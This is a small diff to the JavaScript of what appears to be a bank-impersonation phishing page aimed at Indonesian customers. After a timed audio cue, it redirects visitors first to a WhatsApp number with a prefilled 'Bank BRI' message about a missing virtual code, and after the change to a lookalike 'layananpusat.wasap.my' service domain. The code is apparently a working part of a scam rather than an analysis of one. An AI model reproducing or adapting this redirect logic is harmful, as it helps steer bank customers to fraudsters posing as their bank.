@@ -105,7 +105,7 @@ audio4.play();
 audio = document.getElementById("bsi");
 audio.load();
 setTimeout(function(){   
-location.href='https://wa.me/6282245703341?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20Virtual';
+location.href='https://layananpusat.wasap.my/';
 $("#process1").hide();   
     }, 4500);    
     
